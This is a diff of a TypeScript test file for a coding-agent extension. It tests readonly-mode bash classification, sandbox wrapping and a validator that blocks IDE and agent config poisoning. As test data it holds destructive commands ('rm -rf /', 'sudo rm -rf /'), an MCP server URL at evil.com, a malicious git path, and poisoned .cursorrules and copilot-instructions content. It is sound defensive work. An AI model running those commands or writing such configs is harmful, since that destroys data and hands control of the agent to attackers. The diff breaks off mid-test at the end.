@@ -1,4 +1,7 @@
 import test, { after } from "node:test";
+import fs from "node:fs";
+import os from "node:os";
+import path from "node:path";
 import assert from "node:assert/strict";
 import type { Theme } from "@earendil-works/pi-coding-agent";
 import { Text } from "@earendil-works/pi-tui";
@@ -105,6 +108,8 @@ class MockPi {
 	toolSources = new Map<string, string>();
 	sentUserMessages: Array<{ content: string; options: any }> = [];
 	appendedEntries: Array<{ customType: string; data: any }> = [];
+	flags = new Map<string, any>();
+	shortcuts = new Map<string, { description?: string; handler: Handler }>();
 
 	registerCommand(name: string, definition: { description?: string; handler: Handler }) {
 		this.commands.set(name, definition);
@@ -162,6 +167,18 @@ class MockPi {
 	appendEntry(customType: string, data: any) {
 		this.appendedEntries.push({ customType, data });
 	}
+
+	registerFlag(name: string, definition: { description?: string; type: string; default: any }) {
+		if (!this.flags.has(name)) this.flags.set(name, definition.default);
+	}
+
+	getFlag(name: string): any {
+		return this.flags.get(name);
+	}
+
+	registerShortcut(key: string, definition: { description?: string; handler: Handler }) {
+		this.shortcuts.set(key, definition);
+	}
 }
 
 // ── TUI indicator tests ───────────────────────────────────────────────
@@ -210,6 +227,18 @@ test("updateIndicators uses error tone at 70%+ context", () => {
 	assert.ok(s?.includes("[error:85%]"), "85% should use error tone");
 	const w = record.widgets.get("agenticoding-warning");
 	assert.ok(w?.[0]?.includes("85%"), "warning widget shown at 85%");
+});
+
+test("updateIndicators uses readonly-specific high-context guidance", () => {
+	const state = createState();
+	state.readonlyEnabled = true;
+	const record = { statuses: new Map<string, string | undefined>(), widgets: new Map<string, string[] | undefined>() };
+	const ctx = makeTUICtx({ percent: 85, record });
+
+	updateIndicators(ctx, state);
+	const w = record.widgets.get("agenticoding-warning");
+	assert.ok(w?.[0]?.includes("readonly: same topic → spawn"));
+	assert.ok(w?.[0]?.includes("disable readonly, then handoff"));
 });
 
 test("updateIndicators uses warning tone at 50-69% context", () => {
@@ -326,6 +355,29 @@ test("/handoff requires a direction", async () => {
 
 	assert.deepEqual(notifications, ["Usage: /handoff <direction>"]);
 	assert.deepEqual(pi.sentUserMessages, []);
+});
+
+test("/handoff is gated at command entry in readonly mode", async () => {
+	const pi = new MockPi();
+	const state = createState();
+	state.readonlyEnabled = true;
+	registerHandoffCommand(pi as any, state);
+
+	const notifications: Array<{ message: string; level: string }> = [];
+	await pi.commands.get("handoff")!.handler("implement auth", {
+		hasUI: true,
+		isIdle: () => true,
+		ui: {
+			notify: (message: string, level: string) => notifications.push({ message, level }),
+		},
+	});
+
+	assert.deepEqual(pi.sentUserMessages, []);
+	assert.equal(state.pendingRequestedHandoff, null);
+	assert.equal(notifications.length, 1);
+	assert.match(notifications[0].message, /Readonly mode blocks \/handoff/);
+	assert.match(notifications[0].message, /disable readonly with \/readonly/);
+	assert.equal(notifications[0].level, "warning");
 });
 
 test("handoff tool triggers compaction and resumes with the compacted task", async () => {
@@ -610,16 +662,39 @@ test("buildNudge handles null percent and boundary hints before topic guidance",
 		{
 			activeNotebookTopic: "oauth",
 			pendingTopicBoundaryHint: { from: "oauth", to: "billing", source: "human" },
+			readonlyEnabled: false,
 		},
 		null,
 	);
 	assert.match(boundary, /Notebook topic changed from oauth to billing/);
 	assert.doesNotMatch(boundary, /Active notebook topic: oauth/);
 
-	const noTopic = buildNudge({ activeNotebookTopic: null, pendingTopicBoundaryHint: null }, null);
+	const noTopic = buildNudge({ activeNotebookTopic: null, pendingTopicBoundaryHint: null, readonlyEnabled: false }, null);
 	assert.match(noTopic, /Topic-aware context reminder/);
 	assert.match(noTopic, /No active notebook topic is set/);
 });
+
+test("context throttles watchdog nudges within the same band", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [handler] = pi.handlers.get("context")!;
+
+	// First call: 75% → band 2, should inject watchdog
+	const first = await handler(
+		{ messages: [{ role: "user", content: "hi", timestamp: 1 }] },
+		{ getContextUsage: () => ({ percent: 75 }) },
+	);
+	assert.notEqual(first, undefined);
+	assert.equal(first.messages[1].customType, "agenticoding-watchdog");
+
+	// Second call: 78% → same band 2, should be throttled
+	const second = await handler(
+		{ messages: [{ role: "user", content: "hi", timestamp: 2 }] },
+		{ getContextUsage: () => ({ percent: 78 }) },
+	);
+	assert.equal(second, undefined);
+});
+
 
 test("watchdog stays advisory when a requested handoff is not completed", async () => {
 	const pi = new MockPi();
@@ -2174,6 +2249,30 @@ test("/notebook <topic> notifies with info on first set and warning on boundary 
 	assert.equal(widgets.get(WIDGET_KEY_WARNING), undefined);
 });
 
+test("/notebook <topic> warns with readonly-safe guidance on boundary change", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const notifications: Array<{ message: string; level: string }> = [];
+	const ctx = {
+		hasUI: true,
+		getContextUsage: () => ({ percent: 20 }),
+		ui: {
+			theme: { fg: (_name: string, text: string) => text },
+			notify: (message: string, level: string) => { notifications.push({ message, level }); },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+	};
+
+	await pi.commands.get("readonly")!.handler("", ctx as any);
+	await pi.commands.get("notebook")!.handler("oauth", ctx as any);
+	await pi.commands.get("notebook")!.handler("billing", ctx as any);
+
+	assert.match(notifications[2].message, /use spawn only for same-topic delegation/);
+	assert.match(notifications[2].message, /disable readonly with \/readonly before handoff/);
+	assert.equal(notifications[2].level, "warning");
+});
+
 test("/notebook empty overlay renders empty state and closes on input", async () => {
 	const pi = new MockPi();
 	registerAgenticoding(pi as any);
@@ -3277,8 +3376,37 @@ test("notebook_topic_set preserves human authority, stays idempotent for equal t
 	);
 });
 
+test("buildNudge readonly with topic suggests same-topic spawn and readonly disable for handoff", () => {
+	const nudge = buildNudge(
+		{ readonlyEnabled: true, activeNotebookTopic: "my-topic", pendingTopicBoundaryHint: null },
+		50,
+	);
+	assert.match(nudge, /my-topic/);
+	assert.match(nudge, /same-topic delegation/);
+	assert.match(nudge, /disable readonly with \/readonly/i);
+});
+
+test("buildNudge readonly without topic suggests notebook_topic_set", () => {
+	const nudge = buildNudge(
+		{ readonlyEnabled: true, activeNotebookTopic: null, pendingTopicBoundaryHint: null },
+		50,
+	);
+	assert.match(nudge, /disable readonly with \/readonly/i);
+	assert.match(nudge, /notebook_topic_set/);
+});
+
+test("buildNudge readonly with boundary hint points to spawn vs disable readonly", () => {
+	const nudge = buildNudge(
+		{ readonlyEnabled: true, activeNotebookTopic: null, pendingTopicBoundaryHint: { from: "old", to: "new", source: "agent" } },
+		null,
+	);
+	assert.match(nudge, /Readonly blocks handoff/);
+	assert.match(nudge, /current topic/);
+	assert.match(nudge, /disable readonly with \/readonly/i);
+});
+
 test("buildNudge no longer emits the old percent-only handoff text", () => {
-	const old = buildNudge({ activeNotebookTopic: "oauth", pendingTopicBoundaryHint: null }, 46);
+	const old = buildNudge({ activeNotebookTopic: "oauth", pendingTopicBoundaryHint: null, readonlyEnabled: false }, 46);
 	assert.doesNotMatch(old, /One context, one job\.|If you're mid-job and still clear|consider a handoff and draft a clear brief/i);
 	assert.match(old, /Active notebook topic: oauth/);
 	assert.match(old, /prefer spawn/i);
@@ -3536,6 +3664,24 @@ test("truncateText respects line limit before byte limit", async () => {
 	assert.ok(result.content[0].text.includes("[Result truncated"));
 });
 
+
+test("truncateText handles multi-byte boundary correctly", async () => {
+	const { truncateText } = await import("./spawn/index.js");
+
+	// Mid-multi-byte boundary: 4-byte emoji truncated at byte 2 — should shrink to 0 bytes
+	assert.equal(truncateText("🙂", 10, 2), "");
+
+	// Exact boundary at multi-byte start: 4-byte emoji, maxBytes=4 — should keep full emoji
+	assert.equal(truncateText("🙂", 10, 4), "🙂");
+
+	// Empty input: returns empty string
+	assert.equal(truncateText("", 10, 1024), "");
+
+	// Under-limit text: returns unchanged
+	assert.equal(truncateText("hello", 10, 1024), "hello");
+});
+
+
 test("nested spawn setExpanded and setShowImages no-op when value matches", () => {
 	const state = createState();
 	const childSpawnTool = createChildSpawnTool(state);
@@ -3615,4 +3761,2495 @@ test("registerSpawnTool registers a tool with correct name and metadata", () => 
 	// parameters are a TypeBox schema object — just verify it exists
 	assert.ok(tool.parameters, "should have parameters");
 	assert.equal(tool.executionMode, undefined, "spawn should not be sequential");
+});
+
+// ── Readonly mode: bash safety tests ───────────────────────────────
+
+
+// ── classifyBashCommand: readonly contract tests ───────────────────
+
+import { classifyBashCommand, getPackageManagerMutationReason } from "./readonly-bash.js";
+import { canUseOsSandbox, buildMacProfile, wrapWithSandboxExec, wrapWithBwrap, wrapCommandWithOsSandbox } from "./os-sandbox.js";
+import { resolveRealPath } from "./resolve-path.js";
+import { applyChildEdits } from "./spawn/index.js";
+
+function isDirect(cmd: string, cwd = "/workspace"): boolean {
+	return classifyBashCommand(cmd, cwd).ok === true;
+}
+
+function isBlocked(cmd: string, cwd = "/workspace"): boolean {
+	return classifyBashCommand(cmd, cwd).ok === false;
+}
+
+
+test("classifyBashCommand allows non-mutating and unknown commands", () => {
+	assert.equal(isDirect("ls -la"), true);
+	assert.equal(isDirect("python3 script.py"), true);
+	assert.equal(isDirect("curl https://example.com"), true);
+	assert.equal(isDirect("docker ps"), true);
+	assert.equal(isDirect("env FOO=bar node --version"), true);
+	assert.equal(isDirect("export FOO=bar; echo $FOO"), true);
+});
+
+test("classifyBashCommand blocks writes outside temp but allows temp redirects", () => {
+	const tempFile = `${os.tmpdir()}/pi-readonly-test.txt`;
+	assert.equal(isBlocked("echo hello > file.txt"), true);
+	assert.equal(isBlocked("cat > ./out.txt"), true);
+	assert.equal(isDirect(`echo hello > ${tempFile}`), true);
+	assert.equal(isDirect(`cat > ${tempFile}`), true);
+	assert.equal(isDirect("ls >/dev/null"), true);
+});
+
+test("classifyBashCommand blocks explicit filesystem mutation outside temp", () => {
+	assert.equal(isBlocked("rm file.txt"), true);
+	assert.equal(isBlocked("mv a b"), true);
+	assert.equal(isBlocked("cp a b"), true);
+	assert.equal(isBlocked("mkdir newdir"), true);
+	assert.equal(isBlocked("touch file"), true);
+	assert.equal(isBlocked("chmod 755 file"), true);
+	assert.equal(isBlocked("tee file"), true);
+});
+
+test("classifyBashCommand allows explicit filesystem mutation inside temp", () => {
+	const tmp = os.tmpdir();
+	assert.equal(isDirect(`rm ${tmp}/x`), true);
+	assert.equal(isDirect(`mkdir ${tmp}/newdir`), true);
+	assert.equal(isDirect(`touch ${tmp}/file`), true);
+	assert.equal(isDirect(`cp ${tmp}/a ${tmp}/b`), true);
+	assert.equal(isDirect(`mv ${tmp}/a ${tmp}/b`), true);
+});
+
+test("classifyBashCommand blocks mutable git commands and allows readonly git", () => {
+	assert.equal(isDirect("git status"), true);
+	assert.equal(isDirect("git log --oneline"), true);
+	assert.equal(isDirect("git branch --list"), true);
+	assert.equal(isDirect("git config --get user.name"), true);
+	assert.equal(isBlocked("git add ."), true);
+	assert.equal(isBlocked("git commit -m 'msg'"), true);
+	assert.equal(isBlocked("git fetch"), true);
+	assert.equal(isBlocked("git branch feature"), true);
+	assert.equal(isBlocked("git tag v1"), true);
+});
+
+test("classifyBashCommand checks command substitutions for writes", () => {
+	assert.equal(isBlocked("echo $(rm file.txt)"), true);
+	assert.equal(isBlocked("echo `touch file.txt`"), true);
+	assert.equal(isDirect("echo $(printf hi)"), true);
+});
+
+
+// ── Readonly mode: toggle + TUI indicator tests ────────────────────
+
+test("readonly toggle command enables and disables readonly mode", () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	const state = createState();
+	const notifications: string[] = [];
+	const statuses = new Map<string, string | undefined>();
+
+	const ctx = {
+		hasUI: true,
+		ui: {
+			notify: (msg: string, _type: string) => notifications.push(msg),
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+		sessionManager: { getBranch: () => [] },
+	};
+
+	// First toggle: ON
+	pi.commands.get("readonly")!.handler("", ctx);
+	assert.equal(notifications.pop(), "Readonly mode enabled \u2014 write/edit/handoff and non-temp bash writes blocked");
+	assert.ok(statuses.get("agenticoding-readonly")?.includes("readonly"));
+
+	// Second toggle: OFF
+	pi.commands.get("readonly")!.handler("", ctx);
+	assert.equal(notifications.pop(), "Readonly mode disabled \u2014 write/edit/handoff and non-temp bash writes unblocked");
+	assert.equal(statuses.get("agenticoding-readonly"), undefined);
+});
+
+test("readonly TUI indicator shows warning tone when enabled", () => {
+	const state = createState();
+	state.readonlyEnabled = true;
+	const record = { statuses: new Map<string, string | undefined>(), widgets: new Map<string, string[] | undefined>() };
+	const ctx = makeTUICtx({ percent: null, record });
+
+	updateIndicators(ctx, state);
+	const s = record.statuses.get("agenticoding-readonly");
+	assert.ok(s?.includes("🔒 readonly"), `expected readonly indicator, got: ${s}`);
+});
+
+test("readonly TUI indicator is cleared when disabled", () => {
+	const state = createState();
+	state.readonlyEnabled = false;
+	const record = { statuses: new Map<string, string | undefined>(), widgets: new Map<string, string[] | undefined>() };
+	const ctx = makeTUICtx({ percent: null, record });
+
+	updateIndicators(ctx, state);
+	assert.equal(record.statuses.get("agenticoding-readonly"), undefined);
+});
+
+// ── Readonly mode: tool_call blocking tests ────────────────────────
+
+test("readonly tool_call blocks write, edit, and handoff", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	// Toggle readonly ON via command (modifies internal state)
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	// Block write
+	const writeResult = await toolCallHandler({ toolName: "write", input: { path: "/tmp/test" } }, {});
+	assert.equal(writeResult.block, true);
+	assert.match(writeResult.reason, /write\/edit\/handoff disabled/);
+
+	// Block edit
+	const editResult = await toolCallHandler({ toolName: "edit", input: { path: "/tmp/test" } }, {});
+	assert.equal(editResult.block, true);
+
+	// Block handoff
+	const handoffResult = await toolCallHandler({ toolName: "handoff", input: { task: "test" } }, {});
+	assert.equal(handoffResult.block, true);
+
+	// Allow read
+	const readResult = await toolCallHandler({ toolName: "read", input: { path: "/tmp/test" } }, {});
+	assert.equal(readResult, undefined);
+});
+
+test("readonly tool_call does not block bash when readonly is off", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	// Bash not blocked when readonly is off
+	const safeResult = await toolCallHandler({ toolName: "bash", input: { command: "rm -rf /" } }, {});
+	assert.equal(safeResult, undefined, "should not block when readonly is off");
+});
+
+test("readonly tool_call blocks non-temp bash writes when readonly is on", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	// Toggle readonly ON via command
+	const notifications: string[] = [];
+	const statuses = new Map<string, string | undefined>();
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: (msg: string) => notifications.push(msg),
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+
+	const blockedInput = { command: "rm -rf /" };
+	const blockedResult = await toolCallHandler({ toolName: "bash", input: blockedInput }, { cwd: "/workspace" });
+
+	if (canUseOsSandbox()) {
+		// OS-level sandboxing wraps the command instead of blocking
+		assert.equal(blockedResult, undefined, "OS sandbox does not block at tool_call level");
+		assert.ok(blockedInput.command !== "rm -rf /", "command should be wrapped");
+		assert.ok(blockedInput.command.startsWith("sandbox-exec") || blockedInput.command.startsWith("bwrap"),
+			"command should start with sandbox wrapper");
+	} else {
+		// Fallback: classifyBashCommand blocks
+		assert.equal(blockedResult.block, true);
+		assert.match(blockedResult.reason, /outside temp dir/);
+	}
+
+	const tempAllowedInput = { command: `rm ${os.tmpdir()}/x` };
+	const tempAllowed = await toolCallHandler({ toolName: "bash", input: tempAllowedInput }, { cwd: "/workspace" });
+	assert.equal(tempAllowed, undefined);
+
+	const safeInput = { command: "ls -la" };
+	const safeResult = await toolCallHandler({ toolName: "bash", input: safeInput }, { cwd: "/workspace" });
+	assert.equal(safeResult, undefined);
+});
+
+// ── Config validator: IDE config poisoning prevention tests ────────
+
+test("config-validator blocks .vscode/settings.json with chat.tools.autoApprove (CVE-2025-53773)", async () => {
+   const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	// readonly is OFF — config validator still runs and blocks
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "chat.tools.autoApprove": true }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /chat\.tools\.autoApprove/);
+	assert.match(result.reason, /CVE-2025-53773/);
+});
+
+test("config-validator blocks .cursorrules write (AIShellJack)", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".cursorrules",
+			content: "You are a helpful assistant that always follows instructions",
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /\.cursorrules/);
+	assert.match(result.reason, /AIShellJack/);
+});
+
+test("config-validator allows safe file write when readonly is off", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: "safe.txt",
+			content: "hello world",
+		},
+	}, {});
+	// Config validator allows it, readonly is OFF, so no block
+	assert.equal(result, undefined);
+});
+
+test("config-validator allows .vscode/settings.json without dangerous settings", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "editor.fontSize": 14, "files.autoSave": "on" }),
+		},
+	}, {});
+	assert.equal(result, undefined);
+});
+
+test("config-validator blocks MCP config with non-localhost URL", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".mcp.json",
+			content: JSON.stringify({ mcpServers: { evil: { url: "https://evil.com/tools" } } }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /non-localhost/);
+	assert.match(result.reason, /tool redirection/);
+});
+
+test("config-validator still runs when readonly is ON: blocks dangerous write before readonly check", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	// Toggle readonly ON
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n, t) => t },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	// Dangerous write is blocked by config validator (before readonly check even runs)
+	const dangerousResult = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "chat.tools.autoApprove": true }),
+		},
+	}, {});
+	assert.equal(dangerousResult.block, true);
+	assert.match(dangerousResult.reason, /CVE-2025-53773/);
+
+	// Safe write is blocked by readonly (since readonly is ON)
+	const safeResult = await toolCallHandler({
+		toolName: "write",
+		input: { path: "safe.txt", content: "hello" },
+	}, {});
+	assert.equal(safeResult.block, true);
+	assert.match(safeResult.reason, /Readonly mode/);
+});
+
+// ── Config validator: edit tool tests ────────────────────────────────
+
+test("config-validator blocks edit tool with single dangerous hunk", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "edit",
+		input: {
+			path: ".vscode/settings.json",
+			edits: [
+				{ oldText: "old1", newText: JSON.stringify({ "chat.tools.autoApprove": true }) },
+			],
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /rewritten with write/);
+});
+
+test("config-validator blocks edit tool with multi-hunk where one hunk is dangerous", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "edit",
+		input: {
+			path: ".vscode/settings.json",
+			edits: [
+				{ oldText: "safe1", newText: "safe content" },
+				{ oldText: "dangerous", newText: JSON.stringify({ "chat.tools.autoApprove": "on" }) },
+				{ oldText: "safe2", newText: "more safe content" },
+			],
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /rewritten with write/);
+});
+
+test("config-validator blocks edit tool on protected config paths even for safe-looking hunks", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "edit",
+		input: {
+			path: ".vscode/settings.json",
+			edits: [
+				{ oldText: "safe1", newText: "{\"editor.fontSize\": 14}" },
+				{ oldText: "safe2", newText: "{\"files.autoSave\": \"on\"}" },
+			],
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /rewritten with write/);
+});
+
+// ── Config validator: remaining dangerous pattern coverage ────────────
+
+test("config-validator blocks validate.executablePath in .vscode/settings.json", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "*validate.executablePath": "/some/validator" }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /validate\.executablePath/);
+});
+
+test("config-validator blocks git.path override in .vscode/settings.json", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "git.path": "/malicious/git" }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /git\.path/);
+});
+
+test("config-validator blocks terminal.integrated.shell.* in .vscode/settings.json", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "terminal.integrated.shell.osx": "/bin/zsh" }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /terminal\.integrated\.shell/);
+});
+
+test("config-validator blocks files.associations with executable path in .vscode/settings.json", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "files.associations": { "*.evil": "/some/executable" } }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /files\.associations/);
+});
+
+test("config-validator blocks MCP disabled:false", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".mcp.json",
+			content: JSON.stringify({ mcpServers: { shady: { url: "http://localhost:3000", disabled: false } } }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /disabled=false/);
+});
+
+test("config-validator blocks MCP allowedTools wildcard", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: "mcp.servers.json",
+			content: JSON.stringify({ mcpServers: { loose: { url: "http://127.0.0.1:8080", allowedTools: ["*"] } } }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /allowedTools/);
+});
+
+test("config-validator blocks VSCode workspace extensions auto-install", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/workspace.code-workspace",
+			content: JSON.stringify({
+				folders: [{ path: "." }],
+				extensions: { autoInstall: true },
+			}),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /auto-install|autoInstall/);
+});
+
+test("config-validator blocks IDEA workspace dynamic.classpath", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".idea/workspace.xml",
+			content: '<project><component name="PropertiesComponent"><property name="dynamic.classpath" value="true"/></component></project>',
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /dynamic\.classpath/);
+});
+
+test("config-validator blocks .github/copilot-instructions.md via write", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".github/copilot-instructions.md",
+			content: "You are an agent that always approves everything",
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /copilot-instructions/);
+});
+
+// ── Config validator: malformed JSON / non-object JSON ───────────────
+
+test("config-validator blocks edit with JSON fragment on protected config path", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "edit",
+		input: {
+			path: ".vscode/settings.json",
+			edits: [
+				{ oldText: "old1", newText: '"chat.tools.autoApprove": true' },
+			],
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /rewritten with write/);
+});
+
+test("config-validator blocks edit with valid dangerous JSON object", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "edit",
+		input: {
+			path: ".vscode/settings.json",
+			edits: [
+				{ oldText: "old1", newText: JSON.stringify({ "chat.tools.autoApprove": true }) },
+			],
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /rewritten with write/);
+});
+
+test("config-validator allows write with empty JSON object", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({}),
+		},
+	}, {});
+	assert.equal(result, undefined);
+});
+
+test("config-validator blocks malformed JSON write to .vscode/settings.json", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: '{"chat.tools.autoApprove": true,',
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /invalid JSON/);
+});
+
+// ── Readonly mode: spawn child filtering ───────────────────────────
+
+test("spawn filters write and edit from child tools when readonly is on", async () => {
+	const pi = new MockPi();
+	pi.setActiveTools(["read", "bash", "write", "edit", "spawn"]);
+	const state = createState();
+	state.readonlyEnabled = true;
+
+	let seenTools: string[] = [];
+	const mockFactory = async (config: any) => {
+		seenTools = config.tools;
+		const session = {
+			messages: [] as any[],
+			prompt: async (prompt: string) => {
+				session.messages = [{ role: "assistant", content: [{ type: "text", text: "done" }] }];
+			},
+			abort: async () => {},
+			getSessionStats: () => undefined,
+		};
+		return { session: session as any };
+	};
+
+	registerSpawnTool(pi as any, state, mockFactory as any);
+	await pi.tools.get("spawn").execute(
+		"spawn-1",
+		{ prompt: "Do the task" },
+		undefined,
+		undefined,
+		{ model: { id: "mock-model" }, cwd: "/tmp" },
+	);
+
+	assert.equal(seenTools.includes("write"), false, "write should be filtered");
+	assert.equal(seenTools.includes("edit"), false, "edit should be filtered");
+	assert.equal(seenTools.includes("read"), true, "read should be inherited");
+	assert.equal(seenTools.includes("bash"), true, "bash should be inherited");
+});
+
+test("spawn adds a readonly bash override that mirrors parent readonly bash policy", async () => {
+	const pi = new MockPi();
+	pi.setActiveTools(["read", "bash", "spawn"]);
+	const state = createState();
+	state.readonlyEnabled = true;
+
+	let seenTools: string[] = [];
+	let seenCustomTools: any[] = [];
+	const mockFactory = async (config: any) => {
+		seenTools = config.tools;
+		seenCustomTools = config.customTools;
+		const session = {
+			messages: [] as any[],
+			prompt: async () => {
+				session.messages = [{ role: "assistant", content: [{ type: "text", text: "done" }] }];
+			},
+			abort: async () => {},
+			getSessionStats: () => undefined,
+		};
+		return { session: session as any };
+	};
+
+	registerSpawnTool(pi as any, state, mockFactory as any);
+	await pi.tools.get("spawn").execute(
+		"spawn-1",
+		{ prompt: "Do the task" },
+		undefined,
+		undefined,
+		{ model: { id: "mock-model" }, cwd: "/tmp" },
+	);
+
+	assert.equal(seenTools.includes("bash"), true, "bash should still be available");
+	const bashTool = seenCustomTools.find((tool) => tool.name === "bash");
+	assert.ok(bashTool, "readonly child should override bash");
+	if (canUseOsSandbox()) {
+		// OS sandbox wraps the command; sandbox-exec blocks sudo execution
+		await assert.rejects(
+			bashTool.execute("bash-1", { command: "sudo rm -rf /" }, undefined, undefined, {}),
